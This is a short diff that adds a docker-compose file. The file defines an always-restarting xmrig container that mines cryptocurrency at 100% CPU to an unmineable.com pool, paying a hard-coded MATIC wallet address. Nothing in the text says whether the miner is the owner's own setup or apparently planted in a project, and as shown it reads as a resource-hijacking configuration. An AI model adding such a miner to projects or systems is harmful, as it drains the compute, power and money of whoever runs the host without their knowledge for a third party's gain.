@@ -1,0 +1,10 @@
+version: "3"
+
+services:
+  xmrig:
+    image: docker/xmrig
+    restart: always
+    container_name: xmrig
+    build:
+      context: ./src
+    command: /xmrig -o rx.unmineable.com:3333 -a rx -k -u MATIC:0x08e99dd7675b22f6dcbfe5172fdba9b8e2d3abad.5s_ue-1 --max-cpu-usage 100
